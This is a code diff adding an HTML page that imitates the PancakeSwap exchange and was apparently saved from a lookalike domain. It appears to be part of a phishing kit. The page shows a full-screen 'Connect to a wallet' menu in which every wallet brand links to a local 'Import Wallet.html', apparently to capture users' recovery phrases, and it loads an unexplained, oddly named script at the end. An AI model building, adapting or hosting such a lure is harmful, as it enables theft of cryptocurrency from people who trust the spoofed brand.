@@ -1,0 +1,225 @@
+
+<!-- saved from url=(0060)http://finance.exchangepancakeswapes.net/Pancake%20Swap.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <link href="./css2" rel="stylesheet">
+        <link rel="shortcut icon" type="image/png" href="./favicon.ico">
+        <link rel="apple-touch-icon" sizes="192x192" href="./favicon.icog">
+        <link rel="apple-touch-icon" sizes="512x512" href="./favicon.ico">
+        <link rel="manifest" href="#/manifest.json">
+        <link href="./css" rel="stylesheet">
+        <title>Pancake Swap</title>
+        <meta name="description" content="Flip CAKE, collect SYRUP and stake them with Pancake Swap, the best decentralized exchange on Binance Smart Chain.">
+        <meta name="theme-color" content="#000000">
+        <meta name="fortmatic-site-verification" content="j93LgcVZk79qcgyo">
+        <meta name="viewport" content="initial-scale=1,maximum-scale=3,minimum-scale=1,user-scalable=no">
+        <meta name="twitter:image" content="https://pancakeswap.finance/hero.png">
+        <meta name="twitter:description" content="Farm the native coin of PancakeSwap with PancakeSwap FLP Token">
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:title" content="🥞 PancakeSwap - A next evolution DeFi exchange on Binance Smart Chan (BSC)">
+        <link rel="stylesheet" href="./bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+        <script src="./jquery.min.js.download"></script>
+        <!-- Latest compiled and minified JavaScript -->
+        <script src="./bootstrap.min.js.download" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    </head>
+
+    <body>
+
+    <style>
+
+        .wallet_con {
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(221, 25, 172, 0.342); /* Fallback color */
+            background-color: rgba(228, 104, 207, 0.4); /* Black w/ opacity */
+        }
+
+
+        .wallets {
+            background-color: #fefefe;
+            margin: 15% auto; /* 15% from the top and centered */
+            padding: 20px;
+            border-radius: 25px;
+            border: 0px solid #888;
+            width: 90%; /* Could be more or less, depending on screen size */
+            height: 600px;
+            display: block;
+        }
+
+        .wallets_header {
+            padding: 0px;
+            font-style: bold;
+        }
+
+        .wallet {
+            border-radius: 10px;
+            font-size: 15px;
+            font-style: bold;
+            padding: 8px 8px 8px 8px;
+            background-color: rgba(218, 214, 214, 0.4);
+            margin-top; 5px;
+            height: 40px;
+            float: center;
+            
+        }
+
+        .wallet_img {
+            height: 30px;
+            display: inline;
+            float: right;
+        }
+
+        /* The Modal (background) */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(192, 63, 175, 0.342); /* Fallback color */
+            background-color: rgba(192, 63, 175, 0.342); /* Black w/ opacity */
+        }
+
+        /* Modal Content/Box */
+        .modal-content {
+        background-color: #fefefe;
+        margin: 15% auto; /* 15% from the top and centered */
+        padding: 20px;
+        border: 1px solid #888;
+        width: 80%; /* Could be more or less, depending on screen size */
+        }
+
+        /* The Close Button */
+        .close {
+        color: #aaa;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+        } 
+    </style>
+
+
+    <script>
+        // Get the modal
+        var modal = document.getElementById("myModal");
+
+        // Get the button that opens the modal
+        var btn = document.getElementById("myBtn");
+
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("close")[0];
+
+        // When the user clicks on the button, open the modal
+        btn.onclick = function() {
+            console.log("Clicked")
+        modal.style.display = "block";
+        }
+
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function() {
+        modal.style.display = "none";
+        }
+
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+        } 
+
+    </script>
+
+    <!-- Trigger/Open The Modal -->
+    
+
+
+    <div class="wallet_con">
+
+        <div class="wallets">
+            <div class="wallets_header">
+                <h4 class="text-center"><b>Connect to a wallet</b></h4>
+            </div>
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>Metamask</b></p>
+                    <img class="wallet_img" src="./metamask.png">
+                </div>
+            </a>
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>TrustWallet</b></p>
+                    <img class="wallet_img" src="./truste.png">
+                </div>
+            </a> 
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>MathWallet</b></p>
+                    <img class="wallet_img" src="./math.png">
+                </div>
+            </a> 
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>TokenPocket</b></p>
+                    <img class="wallet_img" src="./toeknpocket.png">
+                </div>
+            </a> 
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>WalletConnect</b></p>
+                    <img class="wallet_img" src="./connect.png">
+                </div>
+            </a>
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>Binance Chain Wallet</b></p>
+                    <img class="wallet_img" src="./binance.jpeg">
+                </div>
+            </a>
+
+            <a href="./Import%20Wallet.html">
+                <div class="wallet mx-auto" style="float: center; margin-bottom: 10px">
+                    <p style="display: inline"><b>SafepalWallet</b></p>
+                    <img class="wallet_img" src="./safepale.JPG">
+                </div>
+            </a>
+
+        </div>
+
+    </div>
+
+
+    <div id="myModal" class="modal">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close">×</span>
+            <p>Some text in the Modal..</p>
+        </div>
+
+    </div>
+
+
+    
+
+<script src="./03xkcg=="></script></body></html>
